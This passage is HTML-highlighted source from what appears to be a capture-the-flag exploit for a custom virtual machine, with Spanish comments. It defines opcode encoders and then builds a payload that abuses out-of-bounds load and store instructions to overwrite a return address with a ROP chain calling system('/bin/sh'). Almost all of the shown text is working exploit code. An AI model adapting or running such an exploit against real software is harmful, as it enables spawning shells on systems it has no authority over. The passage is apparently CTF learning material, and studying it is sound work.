</span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 3</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">op2Idx </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">return</span><span style="color:#393A34"> p16</span><span style="color:#2993a3">(</span><span style="color:#393A34">opcode</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> opcode_nand</span><span style="color:#2993a3">(</span><span style="color:#393A34">op1Idx</span><span style="color:#999999">,</span><span style="color:#393A34"> op2Idx</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">opcode </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 13</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">op1Idx </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 3</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">op2Idx </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">return</span><span style="color:#393A34"> p16</span><span style="color:#2993a3">(</span><span style="color:#393A34">opcode</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> opcode_jmp_eq</span><span style="color:#2993a3">(</span><span style="color:#393A34">op1Idx</span><span style="color:#999999">,</span><span style="color:#393A34"> op2Idx</span><span style="color:#999999">,</span><span style="color:#393A34"> jmp</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">opcode </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 13</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">op1Idx </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 3</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">op2Idx </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">jmp </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7F</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 6</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">return</span><span style="color:#393A34"> p16</span><span style="color:#2993a3">(</span><span style="color:#393A34">opcode</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> opcode_halt</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">opcode </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 13</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">return</span><span style="color:#393A34"> p16</span><span style="color:#2993a3">(</span><span style="color:#393A34">opcode</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> opcode_load</span><span style="color:#2993a3">(</span><span style="color:#393A34">op1Idx</span><span style="color:#999999">,</span><span style="color:#393A34"> op2Idx</span><span style="color:#999999">,</span><span style="color:#393A34"> jmp</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">opcode </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 13</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">op1Idx </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 3</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">op2Idx </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">jmp </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7F</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 6</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">return</span><span style="color:#393A34"> p16</span><span style="color:#2993a3">(</span><span style="color:#393A34">opcode</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> opcode_load_alt</span><span style="color:#2993a3">(</span><span style="color:#393A34">op1Idx</span><span style="color:#999999">,</span><span style="color:#393A34"> op2Idx</span><span style="color:#999999">,</span><span style="color:#393A34"> jmp</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">opcode </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#2F798A">5</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 13</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">op1Idx </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 3</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">op2Idx </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">jmp </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7F</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 6</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">return</span><span style="color:#393A34"> p16</span><span style="color:#2993a3">(</span><span style="color:#393A34">opcode</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> opcode_store</span><span style="color:#2993a3">(</span><span style="color:#393A34">op1Idx</span><span style="color:#999999">,</span><span style="color:#393A34"> op2Idx</span><span style="color:#999999">,</span><span style="color:#393A34"> jmp</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">opcode </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#2F798A">6</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 13</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">op1Idx </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 3</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">op2Idx </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">jmp </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7F</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 6</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">return</span><span style="color:#393A34"> p16</span><span style="color:#2993a3">(</span><span style="color:#393A34">opcode</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#393A34">op1Idx</span><span style="color:#999999">,</span><span style="color:#393A34"> op2Idx</span><span style="color:#999999">,</span><span style="color:#393A34"> jmp</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">opcode </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#2F798A">7</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 13</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">op1Idx </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 3</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">op2Idx </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">jmp </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7F</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 6</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">return</span><span style="color:#393A34"> p16</span><span style="color:#2993a3">(</span><span style="color:#393A34">opcode</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0">######################################################################################</span><br><br><span style="color:#393A34">p </span><span style="color:#999999">=</span><span style="color:#393A34"> connect</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload  </span><span style="color:#999999">=</span><span style="color:#393A34"> opcode_jmp_eq</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7f</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># Registros</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> p16</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">7FFF</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> p16</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">7ffff7df91ab</span><span style="color:#AB5959"> -</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7ffff7df9083</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0"> # Ret offset</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> p16</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">fae7</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">                          # Pop rdi lo</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> p16</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">95bd</span><span style="color:#AB5959"> -</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">9083</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">                 # Binsh lo</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> p16</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">f7f8</span><span style="color:#AB5959"> -</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">f7df</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">                 # Binsh mid</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> p16</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">e20d</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">                          # System lo</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> p16</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">f7e2</span><span style="color:#AB5959"> -</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">f7df</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">                 # System mid</span><br><br><span style="color:#A0ADA0"># Padding</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> *</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">fe</span><span style="color:#AB5959"> -</span><span style="color:#998418"> len</span><span style="color:#1e754f">(</span><span style="color:#393A34">payload</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># Opcodes</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_load_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">             # Cargo 0x7fff en el reg[0]</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_load_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">58</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">38</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">40</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">48</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">50</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_load_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999">  </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">58</span><span style="color:#AB5959">+</span><span style="color:#2F798A">2</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">38</span><span style="color:#AB5959">+</span><span style="color:#2F798A">2</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">40</span><span style="color:#AB5959">+</span><span style="color:#2F798A">2</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">48</span><span style="color:#AB5959">+</span><span style="color:#2F798A">2</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">50</span><span style="color:#AB5959">+</span><span style="color:#2F798A">2</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_load_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999">  </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">58</span><span style="color:#AB5959">+</span><span style="color:#2F798A">4</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">38</span><span style="color:#AB5959">+</span><span style="color:#2F798A">4</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">40</span><span style="color:#AB5959">+</span><span style="color:#2F798A">4</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">48</span><span style="color:#AB5959">+</span><span style="color:#2F798A">4</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">50</span><span style="color:#AB5959">+</span><span style="color:#2F798A">4</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_load_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999">  </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">58</span><span style="color:#AB5959">+</span><span style="color:#2F798A">6</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">38</span><span style="color:#AB5959">+</span><span style="color:#2F798A">6</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">40</span><span style="color:#AB5959">+</span><span style="color:#2F798A">6</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">48</span><span style="color:#AB5959">+</span><span style="color:#2F798A">6</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">50</span><span style="color:#AB5959">+</span><span style="color:#2F798A">6</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_load_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">58</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">           # RET</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_load_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_add</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">38</span><span style="color:#AB5959">+</span><span style="color:#2F798A">0</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_load_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999">  </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">58</span><span style="color:#AB5959">+</span><span style="color:#2F798A">0</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">      # Pop Rdi lo</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_load_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#999999">,</span><span style="color:#2F798A"> 3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_add</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> opcode_store_alt</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span 